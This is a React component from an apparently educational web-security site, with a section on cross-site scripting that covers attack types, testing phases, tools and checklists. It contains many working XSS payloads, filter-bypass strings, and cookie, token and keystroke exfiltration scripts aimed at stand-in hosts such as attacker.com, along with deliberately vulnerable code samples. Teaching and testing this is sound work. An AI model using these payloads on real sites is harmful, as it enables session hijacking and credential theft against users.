
import React from 'react';
import { Code } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';

const XSS: React.FC = () => {
  return (
    <section id="xss" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Cross-Site Scripting (XSS)</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            XSS attacks occur when an application includes untrusted data in a new web page without proper validation or escaping,
            allowing attackers to execute scripts in the victim's browser. This can lead to session hijacking, credential theft,
            malicious redirects, and website defacement. XSS is consistently ranked among the top web application vulnerabilities.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Execute arbitrary JavaScript in victims' browsers to steal cookies/session tokens, 
              redirect to phishing sites, modify page content, or perform actions impersonating the user.
            </AlertDescription>
          </Alert>
        </div>
        
        {/* Types of XSS */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of XSS Attacks</h4>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
            <SecurityCard title="Reflected XSS" description="Non-persistent attack where malicious script is reflected off a web server, typically through URLs, search results, or error messages. The attacker tricks victims into clicking malicious links." severity="medium" />
            <SecurityCard title="Stored XSS" description="Malicious script is permanently stored on the target server (e.g., in a database, comment field, forum post) and later retrieved by victims during normal browsing. Most dangerous form of XSS." severity="high" />
            <SecurityCard title="DOM-based XSS" description="Vulnerability exists in client-side code rather than server-side code. JavaScript modifies the DOM in an unsafe way based on attacker-controllable data sources like URL fragments or localStorage." severity="medium" />
          </div>
        </div>

        {/* Detailed XSS Type Analysis */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Detailed XSS Type Analysis & Testing</h4>
          <Tabs defaultValue="reflected">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="reflected">Reflected XSS</TabsTrigger>
              <TabsTrigger value="stored">Stored XSS</TabsTrigger>
              <TabsTrigger value="dom">DOM-based XSS</TabsTrigger>
              <TabsTrigger value="blind">Blind XSS</TabsTrigger>
            </TabsList>
            
            <TabsContent value="reflected" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Reflected XSS - Non-Persistent</h5>
                  <p className="text-sm mb-3">
                    The malicious script is "reflected" off a web server, such as in an error message, search result, 
                    or any other response that includes some or all of the input sent to the server as part of the request.
                  </p>
                  
                  <h6 className="font-medium mb-2">What to Test:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>URL parameters (GET parameters)</li>
                    <li>Form fields that reflect input back to the user</li>
                    <li>Search boxes and their result pages</li>
                    <li>Error messages that include user input</li>
                    <li>HTTP headers that get reflected (User-Agent, Referer, etc.)</li>
                    <li>Hidden form fields that might be processed</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Identify all input points that reflect data back to the response</li>
                    <li>Test with simple payloads like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
                    <li>Check if input appears in HTML source and how it's encoded</li>
                    <li>Test different contexts (HTML body, attributes, JavaScript blocks)</li>
                    <li>Try various encoding bypass techniques</li>
                    <li>Test with different browsers for consistency</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">Common Entry Points:</h6>
                  <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm">
                    <p className="mb-2 text-green-400"># URL parameter reflection:</p>
                    <p className="mb-3">http://target.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
                    
                    <p className="mb-2 text-green-400"># Error message reflection:</p>
                    <p className="mb-3">http://target.com/login?error=&lt;img src=x onerror=alert(1)&gt;</p>
                    
                    <p className="mb-2 text-green-400"># Header reflection:</p>
                    <p>User-Agent: &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
                  </div>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="stored" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Stored XSS - Persistent</h5>
                  <p className="text-sm mb-3">
                    The malicious script is permanently stored on the target servers, such as in a database, 
                    in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious 
                    script from the server when it requests the stored information.
                  </p>
                  
                  <h6 className="font-medium mb-2">What to Test:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>User profile information (bio, description, name fields)</li>
                    <li>Comment sections and forum posts</li>
                    <li>File upload functionality (especially filename handling)</li>
                    <li>Contact forms and feedback systems</li>
                    <li>Blog posts and article content</li>
                    <li>Configuration settings and preferences</li>
                    <li>Chat messages and messaging systems</li>
                    <li>Review and rating systems</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Identify all input fields that store data permanently</li>
                    <li>Submit XSS payloads through forms, uploads, and APIs</li>
                    <li>Navigate to pages where the stored data is displayed</li>
                    <li>Check if payload executes when viewing content</li>
                    <li>Test with different user accounts to see impact scope</li>
                    <li>Test administrative interfaces for elevated impact</li>
                    <li>Verify payload persistence across sessions and time</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">High-Impact Targets:</h6>
                  <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm">
                    <p className="mb-2 text-green-400"># Admin panel injection:</p>
                    <p className="mb-3">Profile bio: &lt;script&gt;stealAdminCookies()&lt;/script&gt;</p>
                    
                    <p className="mb-2 text-green-400"># Public comment injection:</p>
                    <p className="mb-3">Comment: &lt;img src=x onerror="window.location='http://evil.com?cookie='+document.cookie"&gt;</p>
                    
                    <p className="mb-2 text-green-400"># File upload name injection:</p>
                    <p>Filename: image"&gt;&lt;script&gt;alert('Stored XSS')&lt;/script&gt;.jpg</p>
                  </div>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="dom" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">DOM-based XSS</h5>
                  <p className="text-sm mb-3">
                    The vulnerability exists in client-side code rather than server-side code. The attack payload 
                    is executed as a result of modifying the DOM environment in the victim's browser used by the 
                    original client-side script, so that the client-side code runs in an "unexpected" manner.
                  </p>
                  
                  <h6 className="font-medium mb-2">What to Test:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>URL fragments (#hash) that are processed by JavaScript</li>
                    <li>JavaScript that reads from document.location</li>
                    <li>LocalStorage and SessionStorage data processing</li>
                    <li>PostMessage handlers and cross-frame communication</li>
                    <li>JSON parsing of untrusted data</li>
                    <li>Client-side routing parameters</li>
                    <li>WebSocket message handling</li>
                    <li>Browser history manipulation</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Identify JavaScript code that processes user-controllable data</li>
                    <li>Analyze sources (where data comes from) and sinks (where data is used)</li>
                    <li>Test URL fragments with XSS payloads</li>
                    <li>Use browser developer tools to trace data flow</li>
                    <li>Test different browsers as DOM APIs may vary</li>
                    <li>Check for unsafe DOM manipulation functions</li>
                    <li>Test client-side template rendering</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">Common Sources and Sinks:</h6>
                  <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm">
                    <p className="mb-2 text-green-400"># Common Sources:</p>
                    <p className="mb-1">document.location.hash</p>
                    <p className="mb-1">document.location.search</p>
                    <p className="mb-1">localStorage.getItem()</p>
                    <p className="mb-3">window.name</p>
                    
                    <p className="mb-2 text-green-400"># Dangerous Sinks:</p>
                    <p className="mb-1">element.innerHTML</p>
                    <p className="mb-1">document.write()</p>
                    <p className="mb-1">eval()</p>
                    <p className="mb-3">setTimeout() with string</p>
                    
                    <p className="mb-2 text-green-400"># Example payload:</p>
                    <p>http://target.com/page#&lt;img src=x onerror=alert(1)&gt;</p>
                  </div>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="blind" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Blind XSS</h5>
                  <p className="text-sm mb-3">
                    A type of stored XSS where the attacker cannot see the payload execution immediately. 
                    The payload executes in a different context, often in administrative panels, log viewers, 
                    or other areas not directly accessible to the attacker.
                  </p>
                  
                  <h6 className="font-medium mb-2">What to Test:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Contact forms and support ticket systems</li>
                    <li>User-Agent and HTTP headers logged by applications</li>
                    <li>Log file viewers and administrative dashboards</li>
                    <li>Error reporting and monitoring systems</li>
                    <li>Analytics and tracking systems</li>
                    <li>Email templates that include user data</li>
                    <li>PDF generation systems</li>
                    <li>Internal reporting tools</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Set up callback server to receive notifications</li>
                    <li>Inject payloads that make HTTP requests to your server</li>
                    <li>Submit payloads through all possible input vectors</li>
                    <li>Wait for callbacks to confirm execution</li>
                    <li>Test with different payload types and contexts</li>
                    <li>Use tools like XSS Hunter for automated callback handling</li>
                    <li>Monitor for extended periods as execution may be delayed</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">Blind XSS Payloads:</h6>
                  <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm">
                    <p className="mb-2 text-green-400"># Basic callback payload:</p>
                    <p className="mb-3">&lt;script&gt;new Image().src='http://attacker.com/xss?cookie='+document.cookie&lt;/script&gt;</p>
                    
                    <p className="mb-2 text-green-400"># Advanced information gathering:</p>
                    <p className="mb-3">&lt;script&gt;fetch('http://attacker.com/data',{`{method:'POST',body:JSON.stringify({url:location.href,cookie:document.cookie,dom:document.documentElement.innerHTML})}`)}&lt;/script&gt;</p>
                    
                    <p className="mb-2 text-green-400"># SVG-based payload (for filtering bypass):</p>
                    <p>&lt;svg onload="fetch('http://attacker.com/xss?data='+btoa(document.cookie))"&gt;&lt;/svg&gt;</p>
                  </div>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Comprehensive Testing Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive XSS Testing Methodology</h4>
          <Tabs defaultValue="reconnaissance">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="reconnaissance">Reconnaissance</TabsTrigger>
              <TabsTrigger value="injection">Injection Testing</TabsTrigger>
              <TabsTrigger value="context">Context Analysis</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
            </TabsList>
            
            <TabsContent value="reconnaissance" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: Reconnaissance and Mapping</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Map Input Vectors:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Identify all user input points (forms, URL parameters, headers)</li>
                      <li>Map file upload functionality and handling</li>
                      <li>Identify AJAX endpoints and API calls</li>
                      <li>Look for hidden form fields and parameters</li>
                      <li>Check for client-side data sources (localStorage, URL fragments)</li>
                    </ul>
                  </li>
                  <li><strong>Analyze Application Flow:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Understand where user input is reflected or stored</li>
                      <li>Identify different user roles and access levels</li>
                      <li>Map administrative interfaces and functions</li>
                      <li>Understand session management and authentication</li>
                    </ul>
                  </li>
                  <li><strong>Technology Stack Analysis:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Identify framework and technologies used</li>
                      <li>Check for known vulnerabilities in used libraries</li>
                      <li>Analyze client-side JavaScript code</li>
                      <li>Check Content Security Policy (CSP) headers</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="injection" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Injection Testing</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Basic Payload Testing:</strong>
                    <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm mt-2">
                      <p className="mb-2 text-green-400"># Start with simple payloads:</p>
                      <p className="mb-1">&lt;script&gt;alert(1)&lt;/script&gt;</p>
                      <p className="mb-1">&lt;img src=x onerror=alert(1)&gt;</p>
                      <p className="mb-1">&lt;svg onload=alert(1)&gt;</p>
                      <p className="mb-3">javascript:alert(1)</p>
                      
                      <p className="mb-2 text-green-400"># Test for reflection:</p>
                      <p>uniquestring12345</p>
                    </div>
                  </li>
                  <li><strong>Filter Bypass Testing:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Test case variations (ScRiPt vs script)</li>
                      <li>Try encoding bypasses (URL, HTML, Unicode)</li>
                      <li>Test with null bytes and special characters</li>
                      <li>Use different quote types and no-quote payloads</li>
                      <li>Test with different tag and event combinations</li>
                    </ul>
                  </li>
                  <li><strong>Protocol and Method Testing:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Test GET, POST, PUT, DELETE methods</li>
                      <li>Test different Content-Type headers</li>
                      <li>Try JSON, XML, and multipart form data</li>
                      <li>Test with different encoding types</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="context" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: Context Analysis</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>HTML Context Testing:</strong>
                    <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm mt-2">
                      <p className="mb-2 text-green-400"># Between HTML tags:</p>
                      <p className="mb-3">&lt;script&gt;alert(1)&lt;/script&gt;</p>
                      
                      <p className="mb-2 text-green-400"># Inside HTML attributes:</p>
                      <p className="mb-3">" onmouseover="alert(1)</p>
                      
                      <p className="mb-2 text-green-400"># Inside event handlers:</p>
                      <p>'; alert(1); //</p>
                    </div>
                  </li>
                  <li><strong>JavaScript Context Testing:</strong>
                    <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm mt-2">
                      <p className="mb-2 text-green-400"># Inside script tags:</p>
                      <p className="mb-3">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p>
                      
                      <p className="mb-2 text-green-400"># Inside JavaScript strings:</p>
                      <p className="mb-3">'; alert(1); var x='</p>
                      
                      <p className="mb-2 text-green-400"># Template literal injection:</p>
                      <p>\${alert(1)}</p>
                    </div>
                  </li>
                  <li><strong>CSS Context Testing:</strong>
                    <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm mt-2">
                      <p className="mb-2 text-green-400"># CSS expression injection:</p>
                      <p className="mb-3">expression(alert(1))</p>
                      
                      <p className="mb-2 text-green-400"># CSS import injection:</p>
                      <p>@import 'javascript:alert(1)';</p>
                    </div>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Exploitation and Impact Assessment</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Cookie and Session Theft:</strong>
                    <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm mt-2">
                      <p className="mb-2 text-green-400"># Basic cookie theft:</p>
                      <p className="mb-3">fetch('http://attacker.com/steal?c='+btoa(document.cookie))</p>
                      
                      <p className="mb-2 text-green-400"># Session token extraction:</p>
                      <p>fetch('http://attacker.com/token?t='+localStorage.getItem('token'))</p>
                    </div>
                  </li>
                  <li><strong>Keylogging and Form Hijacking:</strong>
                    <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm mt-2">
                      <p className="mb-2 text-green-400"># Basic keylogger:</p>
                      <p className="mb-3">document.addEventListener('keypress',e=&gt;fetch('http://attacker.com/keys?k='+e.key))</p>
                      
                      <p className="mb-2 text-green-400"># Form hijacking:</p>
                      <p>document.forms[0].action='http://attacker.com/harvest'</p>
                    </div>
                  </li>
                  <li><strong>BeEF Integration and Advanced Exploitation:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Use Browser Exploitation Framework for advanced attacks</li>
                      <li>Test for camera/microphone access in modern browsers</li>
                      <li>Attempt to extract autofill data</li>
                      <li>Test for clipboard access and manipulation</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Advanced XSS Testing Techniques */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Advanced XSS Testing Techniques</h4>
          <div className="space-y-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">WAF and Filter Evasion</h5>
              <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm">
                <p className="mb-2 text-green-400"># Double encoding:</p>
                <p className="mb-3">%253Cscript%253Ealert(1)%253C/script%253E</p>
                
                <p className="mb-2 text-green-400"># Unicode encoding:</p>
                <p className="mb-3">&lt;script&gt;\u0061lert(1)&lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># HTML entity encoding:</p>
                <p className="mb-3">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>
                
                <p className="mb-2 text-green-400"># Mixed case bypass:</p>
                <p className="mb-3">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</p>
                
                <p className="mb-2 text-green-400"># Using different protocols:</p>
                <p className="mb-3">data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># NULL byte injection:</p>
                <p>&lt;script%00&gt;alert(1)&lt;/script&gt;</p>
              </div>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Browser-Specific Payloads</h5>
              <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm">
                <p className="mb-2 text-green-400"># Chrome/WebKit specific:</p>
                <p className="mb-3">&lt;iframe srcdoc="&amp;lt;img src&amp;#61;x onerror&amp;#61;alert&amp;#40;1&amp;#41;&amp;gt;"&gt;</p>
                
                <p className="mb-2 text-green-400"># Firefox specific:</p>
                <p className="mb-3">&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;</p>
                
                <p className="mb-2 text-green-400"># Internet Explorer specific:</p>
                <p className="mb-3">&lt;xml id=x&gt;&lt;a&gt;&lt;b&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># Safari specific:</p>
                <p>&lt;embed src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</p>
              </div>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">File Upload XSS Testing</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm mb-3">
                <li>Upload HTML files with script tags</li>
                <li>Upload SVG files with embedded JavaScript</li>
                <li>Test PDF upload with JavaScript injection</li>
                <li>Upload files with malicious metadata</li>
                <li>Test filename injection vulnerabilities</li>
                <li>Upload polyglot files (files that are valid in multiple formats)</li>
              </ul>
              <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-sm">
                <p className="mb-2 text-green-400"># SVG XSS payload:</p>
                <p className="mb-3">&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"&gt;&lt;/svg&gt;</p>
                
                <p className="mb-2 text-green-400"># HTML file upload:</p>
                <p className="mb-3">&lt;html&gt;&lt;body&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</p>
                
                <p className="mb-2 text-green-400"># Filename injection:</p>
                <p>file"&gt;&lt;script&gt;alert(1)&lt;/script&gt;.jpg</p>
              </div>
            </div>
          </div>
        </div>

        {/* Automated Testing Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Automated XSS Testing Tools</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Commercial Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Burp Suite Professional:</strong> Advanced XSS scanner with custom payloads</li>
                <li><strong>OWASP ZAP:</strong> Free alternative with active and passive scanning</li>
                <li><strong>Nessus:</strong> Comprehensive vulnerability scanner including XSS</li>
                <li><strong>Acunetix:</strong> Specialized web application security scanner</li>
                <li><strong>AppScan:</strong> IBM's enterprise web application security testing</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Specialized XSS Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>XSS Hunter:</strong> Platform for finding blind XSS vulnerabilities</li>
                <li><strong>XSSer:</strong> Automatic framework to detect and exploit XSS</li>
                <li><strong>Xenotix XSS Exploit Framework:</strong> Advanced XSS vulnerability scanner</li>
                <li><strong>BruteXSS:</strong> Tool to find XSS vulnerabilities in web applications</li>
                <li><strong>XSStrike:</strong> Advanced XSS detection suite</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Manual Testing Checklist */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Manual XSS Testing Checklist</h4>
          <div className="space-y-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Pre-Testing Setup</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Set up intercepting proxy (Burp Suite/ZAP)</li>
                <li>Configure browser for testing (disable XSS protection)</li>
                <li>Set up callback server for blind XSS testing</li>
                <li>Prepare payload wordlists and test cases</li>
                <li>Document application structure and functionality</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Testing Execution Checklist</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>✓ Test all input fields with basic XSS payloads</li>
                <li>✓ Test URL parameters and fragments</li>
                <li>✓ Test HTTP headers (User-Agent, Referer, etc.)</li>
                <li>✓ Test file upload functionality</li>
                <li>✓ Test AJAX endpoints and API calls</li>
                <li>✓ Test with different user privilege levels</li>
                <li>✓ Test stored data in user profiles and settings</li>
                <li>✓ Test error messages and help text</li>
                <li>✓ Test search functionality and results</li>
                <li>✓ Test comment and messaging systems</li>
                <li>✓ Test with different browsers</li>
                <li>✓ Test for blind XSS in admin interfaces</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold text-lg mb-2">Post-Testing Documentation</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Document all identified injection points</li>
                <li>Record successful payloads and contexts</li>
                <li>Assess impact and exploitability</li>
                <li>Create proof-of-concept demonstrations</li>
                <li>Provide remediation recommendations</li>
                <li>Rate severity based on impact and likelihood</li>
              </ul>
            </div>
          </div>
        </div>
        
        {/* Commonly Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <ul className="list-disc pl-6 space-y-2 mb-4">
            <li><strong>User Input Fields:</strong> Comment sections, search boxes, contact forms, user profiles</li>
            <li><strong>URL Parameters:</strong> Query strings, fragment identifiers</li>
            <li><strong>HTTP Headers:</strong> Referer, User-Agent (when reflected in pages)</li>
            <li><strong>File Upload Features:</strong> Especially those allowing HTML or SVG uploads</li>
            <li><strong>Data Import Functions:</strong> CSV imports with HTML/JavaScript injection</li>
            <li><strong>Third-Party Widgets:</strong> External content that may not follow the same security practices</li>
          </ul>
        </div>
        
        {/* Impact of XSS */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Impact of XSS Attacks</h4>
          <ul className="list-disc pl-6 space-y-2 mb-4">
            <li><strong>Session Hijacking:</strong> Stealing session cookies to impersonate users</li>
            <li><strong>Credential Harvesting:</strong> Creating fake login forms to steal passwords</li>
            <li><strong>Keylogging:</strong> Recording user keypresses to capture sensitive information</li>
            <li><strong>Phishing:</strong> Injecting convincing phishing content into trusted sites</li>
            <li><strong>Web Application Defacement:</strong> Modifying the appearance of websites</li>
            <li><strong>Malware Distribution:</strong> Redirecting users to malware downloads</li>
            <li><strong>Cross-Site Request Forgery (CSRF):</strong> Forcing the user's browser to perform unwanted actions</li>
            <li><strong>Browser Exploitation:</strong> Leveraging browser vulnerabilities to install malware</li>
          </ul>
        </div>
        
        {/* How XSS Works */}
        <div>
          <h4 className="text-xl font-semibold mb-4">How XSS Vulnerabilities Work</h4>
          <ol className="list-decimal pl-6 space-y-2 mb-4">
            <li><strong>Entry Point Identification:</strong> Attacker identifies where user input is accepted (forms, URLs, etc.)</li>
            <li><strong>Input Reflection/Storage:</strong> The application includes this input in HTML responses either immediately (reflected) or after storage (stored)</li>
            <li><strong>Escaping Bypass:</strong> The attacker crafts input that bypasses any existing validation or sanitization</li>
            <li><strong>Payload Execution:</strong> When the victim loads the affected page, the injected script executes in their browser</li>
            <li><strong>Data Exfiltration/Manipulation:</strong> The script accesses sensitive data or performs actions on behalf of the victim</li>
          </ol>
        </div>
        
        {/* Sample Payloads */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Sample XSS Payloads</h4>
          <Tabs defaultValue="basic">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="basic">Basic Payloads</TabsTrigger>
              <TabsTrigger value="advanced">Advanced Payloads</TabsTrigger>
              <TabsTrigger value="bypass">Filter Bypasses</TabsTrigger>
            </TabsList>
            <TabsContent value="basic" className="mt-4">
              <div className="bg-cybr-muted/50 p-4 rounded-md overflow-x-auto font-mono text-sm">
                <p className="mb-2 text-green-400"># Basic alert payload:</p>
                <p className="mb-3">&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># Event handler based:</p>
                <p className="mb-3">&lt;img src="x" onerror="alert('XSS')"&gt;</p>
                
                <p className="mb-2 text-green-400"># JavaScript URI:</p>
                <p className="mb-3">&lt;a href="javascript:alert('XSS')"&gt;Click Me&lt;/a&gt;</p>
                
                <p className="mb-2 text-green-400"># DOM event:</p>
                <p>&lt;body onload="alert('XSS')"&gt;</p>
              </div>
            </TabsContent>
            
            <TabsContent value="advanced" className="mt-4">
              <div className="bg-cybr-muted/50 p-4 rounded-md overflow-x-auto font-mono text-sm">
                <p className="mb-2 text-green-400"># Cookie stealing:</p>
                <p className="mb-3">&lt;script&gt;
                  {`
                  // Using a hypothetical malicious script
                  var stolenCookie = document.cookie;
                  // Send to attacker's server
                  new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(stolenCookie);
                  `}
                  &lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># Keylogger:</p>
                <p className="mb-3">&lt;script&gt;
                  {`
                  // Hypothetical malicious keylogger
                  document.addEventListener('keypress', function(evt) {
                    var key = evt.key;
                    // Send to attacker's server
                    navigator.sendBeacon('https://attacker.com/log', key);
                  });
                  `}
                  &lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># Session hijacking with XHR:</p>
                <p>&lt;script&gt;
                  {`
                  // Hypothetical session hijacking script
                  var xhr = new XMLHttpRequest();
                  xhr.open('GET', 'https://vulnerable-site.com/account', true);
                  xhr.onload = function() {
                    var data = btoa(this.responseText);
                    // Send to attacker's server
                    navigator.sendBeacon('https://attacker.com/steal', data);
                  };
                  xhr.send();
                  `}
                  &lt;/script&gt;</p>
              </div>
            </TabsContent>
            
            <TabsContent value="bypass" className="mt-4">
              <div className="bg-cybr-muted/50 p-4 rounded-md overflow-x-auto font-mono text-sm">
                <p className="mb-2 text-green-400"># Case manipulation bypass:</p>
                <p className="mb-3">&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</p>
                
                <p className="mb-2 text-green-400"># Encoded characters bypass:</p>
                <p className="mb-3">&lt;img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"&gt;</p>
                
                <p className="mb-2 text-green-400"># No quotes required:</p>
                <p className="mb-3">&lt;script&gt;alert`XSS`&lt;/script&gt;</p>
                
                <p className="mb-2 text-green-400"># Exotic contexts:</p>
                <p>&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;&lt;/svg&gt;</p>
              </div>
            </TabsContent>
          </Tabs>
        </div>
        
        {/* Examples of Vulnerable Code */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Example Vulnerable Code</h4>
          <CodeExample language="javascript" isVulnerable={true} title="Vulnerable Code" code={`// Directly inserting user input into HTML
document.getElementById("output").innerHTML = 
  "Search results for: " + userInput;

// Attacker input: <script>sendCookiesToAttacker(document.cookie)</script>
// This executes the script in the victim's browser

// Server-side example (PHP)
<?php
echo '<div>Welcome, ' . $_GET['name'] . '!</div>';
?>
// Attacker request: /page.php?name=<script>alert(document.cookie)</script>

// React example with dangerouslySetInnerHTML
function Comment({ userComment }) {
  return <div dangerouslySetInnerHTML={{ __html: userComment }} />;
}
